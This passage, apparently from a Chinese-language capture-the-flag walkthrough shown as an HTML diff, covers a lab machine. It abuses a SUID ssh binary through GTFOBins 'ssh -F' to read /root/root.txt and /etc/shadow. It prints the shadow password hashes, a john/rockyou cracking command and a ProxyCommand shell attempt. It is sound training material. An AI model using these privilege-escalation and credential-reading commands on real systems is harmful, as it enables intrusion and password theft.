 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ad9039f0d46f361810995d84e4efdd765826bfb363827fec800cc32adb3671cb/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632353233343534383834342e706e67"><img src="https://camo.githubusercontent.com/ad9039f0d46f361810995d84e4efdd765826bfb363827fec800cc32adb3671cb/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632353233343534383834342e706e67" alt="image-20250625234548844" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250625234548844.png" style="max-width: 100%;"></a></p>
 <p>重点关注<code class="notranslate">标红</code>的内容，容易发现 <code class="notranslate">/usr/bin/ssh</code>的<code class="notranslate">SGID</code>异常</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">welcome@pdf:~$ find / -perm -u=s -type f 2&gt;/dev/null
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@pdf:<span class="pl-k">~</span>$ find / -perm -u=s -type f <span class="pl-k">2&gt;</span>/dev/null
 /usr/bin/ssh
-welcome@pdf:~$ ls -l /usr/bin/ssh
--rwsr-sr-x 1 root root 797480 Dec 21  2023 /usr/bin/ssh
-</code></pre>
+welcome@pdf:<span class="pl-k">~</span>$ ls -l /usr/bin/ssh
+-rwsr-sr-x 1 root root 797480 Dec 21  2023 /usr/bin/ssh</pre></div>
 <h5><code class="notranslate">ssh</code>提权</h5>
 <p><code class="notranslate">gtfobins</code>查表，有现成的读文件方案</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">#https://gtfobins.github.io/gtfobins/ssh/#shell
-##File read
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>https://gtfobins.github.io/gtfobins/ssh/#shell</span>
+<span class="pl-c"><span class="pl-c">#</span>#File read</span>
 LFILE=file_to_read
-ssh -F $LFILE localhost
-</code></pre>
+ssh -F <span class="pl-smi">$LFILE</span> localhost</pre></div>
 <p>先读取<code class="notranslate">/root/root.txt</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">welcome@pdf:~$ ssh -F /root/root.txt localhost
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@pdf:<span class="pl-k">~</span>$ ssh -F /root/root.txt localhost
 /root/root.txt: line 1: Bad configuration option: flag{root-21d72a06840925613b0ea50e84587620}
-/root/root.txt: terminating, 1 bad configuration options
-</code></pre>
+/root/root.txt: terminating, 1 bad configuration options</pre></div>
 <p>再读取<code class="notranslate">/etc/shadow</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">welcome@pdf:~$ ssh -F /etc/shadow localhost
-/etc/shadow: line 1: Bad configuration option: root:$6$qgppm7vz3uxoh2kt$vkj8.on1has6b9.tm8ms5fwhmvmxrvz29bcznqmjfqojkphvaznoozhyt0.o2x3s3nbqrswpci.lhvk94armu.:20263:0:99999:7:::
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@pdf:<span class="pl-k">~</span>$ ssh -F /etc/shadow localhost
+/etc/shadow: line 1: Bad configuration option: root:<span class="pl-smi">$6</span><span class="pl-smi">$qgppm7vz3uxoh2kt$vkj8</span>.on1has6b9.tm8ms5fwhmvmxrvz29bcznqmjfqojkphvaznoozhyt0.o2x3s3nbqrswpci.lhvk94armu.:20263:0:99999:7:::
 ....
-welcome:$6$dhmqudmnaomw.das$o1bwxwdtmdf8n6xa5yupvk65ylc9jmuimtglu2lbsskmpah.lvot41/xsb.kxp1feszjevu8lpoylsvcdm2va.:20263:0:99999:7:::
-/etc/shadow: terminating, 26 bad configuration options
-</code></pre>
+welcome:<span class="pl-smi">$6</span><span class="pl-smi">$dhmqudmnaomw</span>.das<span class="pl-smi">$o1bwxwdtmdf8n6xa5yupvk65ylc9jmuimtglu2lbsskmpah</span>.lvot41/xsb.kxp1feszjevu8lpoylsvcdm2va.:20263:0:99999:7:::
+/etc/shadow: terminating, 26 bad configuration options</pre></div>
 <p>拿到<code class="notranslate">root</code>用户密码哈希值（格式为<code class="notranslate">$6$...</code>），这是<code class="notranslate">Linux</code>系统使用<code class="notranslate">SHA-512</code>算法加密的密码。爆破一下</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# echo 'root:$6$qgppm7vz3uxoh2kt$vkj8.on1has6b9.tm8ms5fwhmvmxrvz29bcznqmjfqojkphvaznoozhyt0.o2x3s3nbqrswpci.lhvk94armu.:20263:0:99999:7:::'&gt;hash                                        
-└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash 
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> echo 'root:$6$qgppm7vz3uxoh2kt$vkj8.on1has6b9.tm8ms5fwhmvmxrvz29bcznqmjfqojkphvaznoozhyt0.o2x3s3nbqrswpci.lhvk94armu.:20263:0:99999:7:::'&gt;hash                                        </span>
+└─<span class="pl-c"><span class="pl-c">#</span> john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash </span></pre></div>
 <p>直接爆破不行，因为<code class="notranslate">ssh -F读文件会自动转为小写</code></p>
 <p>本靶机虽然有私钥但漏配置了<code class="notranslate">authorized_keys</code>所以读<code class="notranslate">root</code>的私钥登录这条路也不行，如果靶机配置了<code class="notranslate">authorized_keys</code>就可以使用<code class="notranslate">ssh -i /root/.ssh/id_rsa root@localhost </code> 方式登陆了</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/690fb61c67c4089531280ed5fa89c276a183f2ea0f540a959f272e613e4587e9/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632393037303235393231372e706e67"><img src="https://camo.githubusercontent.com/690fb61c67c4089531280ed5fa89c276a183f2ea0f540a959f272e613e4587e9/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632393037303235393231372e706e67" alt="image-20250629070259217" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250629070259217.png" style="max-width: 100%;"></a></p>
 <p>如果像HYH一样欧皇运气爆棚，直接猜到<code class="notranslate">root</code>密码是<code class="notranslate">57</code>（数字是不是很熟悉，前面隐藏信息的就是第57个pdf），或许就成功和作者对上脑电波了</p>
 <h5>拿到<code class="notranslate">root.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"></pre></div>
 <p>测试<code class="notranslate">ProxyCommand </code>参数执行命令失败</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#ProxyCommand参数执行命令
-/usr/bin/ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
-</code></pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>ProxyCommand参数执行命令</span>
+/usr/bin/ssh -o ProxyCommand=<span class="pl-s"><span class="pl-pds">'</span>;sh 0&lt;&amp;2 1&gt;&amp;2<span class="pl-pds">'</span></span> x</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
